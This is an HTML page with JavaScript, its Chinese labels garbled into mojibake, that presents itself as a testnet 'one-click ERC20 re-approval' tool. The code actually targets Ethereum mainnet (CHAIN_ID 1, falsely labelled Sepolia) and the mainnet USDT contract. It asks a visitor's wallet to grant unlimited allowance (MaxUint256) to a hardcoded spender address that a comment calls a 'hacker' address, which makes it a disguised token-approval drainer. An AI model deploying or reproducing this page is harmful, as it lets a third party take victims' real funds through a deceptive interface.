<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <title>ERC20 ä¸€é”®äºŒæ¬¡æˆæƒï¼ˆå…ˆç½®0â†’MaxUintï¼‰</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- ethers.js v6 -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.min.js"></script>
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 16px; background:#f8f9fb; }
    .card { max-width: 680px; margin: 0 auto; padding: 16px; border: 1px solid #eee; border-radius: 12px; background: #fff; box-shadow: 0 4px 18px rgba(0,0,0,.06); }
    button { padding: 12px 16px; border-radius: 10px; border: none; cursor: pointer; font-size: 16px; }
    .primary{ background:#3b82f6; color:white }
    code { background:#f6f8fa; padding:2px 6px; border-radius:6px; word-break: break-all; }
    pre{background:#0b1020;color:#c7d2fe;padding:12px;border-radius:10px;overflow:auto}
  </style>
</head>
<body>
  <div class="card">
    <h2>ERC20 ä¸€é”®äºŒæ¬¡æˆæƒï¼ˆapprove 0 â†’ MaxUintï¼‰</h2>
    <p><b>ä»…ç”¨äºæµ‹è¯•ï¼Œæ¨èåœ¨ Sepolia æµ‹è¯•ç½‘ä½¿ç”¨ï¼</b></p>
    <ul>
      <li>ä»£å¸åˆçº¦åœ°å€ï¼š<code id="token"></code></li>
      <li>è¢«æˆæƒåœ°å€ (spender)ï¼š<code id="spender"></code></li>
      <li>ç½‘ç»œï¼š<code id="network"></code></li>
    </ul>
    <button class="primary" id="btn">æ‰§è¡ŒäºŒæ¬¡æˆæƒ</button>
    <pre id="log">æ—¥å¿—ï¼š</pre>
  </div>

<script>
(async () => {
  // ======== é…ç½®éƒ¨åˆ†ï¼ˆè¯·æŒ‰éœ€ä¿®æ”¹ï¼‰ ========
  const CHAIN_ID = 1; // Sepolia æµ‹è¯•ç½‘
  const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // æ›¿æ¢æˆä½ çš„ ERC20 æµ‹è¯•ä»£å¸åœ°å€
  const SPENDER        = "0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2";    // æ›¿æ¢æˆæµ‹è¯•â€œé»‘å®¢â€åœ°å€
  // ========================================

  // æ˜¾ç¤ºé…ç½®
  document.getElementById('token').textContent   = TOKEN_CONTRACT;
  document.getElementById('spender').textContent = SPENDER;
  document.getElementById('network').textContent = `Sepolia (${CHAIN_ID})`;

  const ERC20_ABI = [
    "function approve(address spender, uint256 value) external returns (bool)",
    "function allowance(address owner, address spender) external view returns (uint256)"
  ];

  const logEl = document.getElementById('log');
  const log = (m)=>{ const now=new Date().toLocaleTimeString(); logEl.textContent+=`\n[${now}] ${m}`; logEl.scrollTop=logEl.scrollHeight; }

  function hasProvider(){ return typeof window.ethereum !== 'undefined'; }

  async function connect(){
    if(!hasProvider()){ log("âŒ æœªæ£€æµ‹åˆ°é’±åŒ…ï¼Œè¯·åœ¨ MetaMask / imToken (ä»¥å¤ªåŠæ¨¡å—) DApp æµè§ˆå™¨ä¸­æ‰“å¼€"); return null; }
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const net = await provider.getNetwork();
    if(Number(net.chainId)!==CHAIN_ID){
      try{
        await window.ethereum.request({
          method:"wallet_switchEthereumChain",
          params:[{ chainId:"0x"+CHAIN_ID.toString(16) }]
        });
      }catch(e){ log("âŒ è¯·æ‰‹åŠ¨åˆ‡æ¢åˆ° Sepolia ç½‘ç»œ"); return null; }
    }
    return provider;
  }

  async function approveZeroThenMax(){
    try{
      const provider = await connect(); if(!provider) return;
      const signer = await provider.getSigner();
      const erc20 = new ethers.Contract(TOKEN_CONTRACT, ERC20_ABI, signer);

      // Step 1: approve(spender, 0)
      log("â³ Step1: approve(spender, 0)...");
      let tx = await erc20.approve(SPENDER, 0n);
      log(`æäº¤äº¤æ˜“ï¼š${tx.hash}`);
      await tx.wait();
      log("âœ… Step1 å®Œæˆ");

      // Step 2: approve(spender, MaxUint)
      log("â³ Step2: approve(spender, MaxUint256)...");
      tx = await erc20.approve(SPENDER, ethers.MaxUint256);
      log(`æäº¤äº¤æ˜“ï¼š${tx.hash}`);
      await tx.wait();
      log("âœ… Step2 å®Œæˆ â€” å·²æ— é™æˆæƒ");

      // éªŒè¯ allowance
      const owner = await signer.getAddress();
      const allowance = await erc20.allowance(owner, SPENDER);
      log(`ğŸ” å½“å‰ allowance = ${allowance.toString()}`);
    }catch(e){
      log("âŒ å‡ºé”™ï¼š"+(e?.reason || e?.message || e));
    }
  }

  document.getElementById('btn').onclick = approveZeroThenMax;
})();
</script>
</body>
</html>
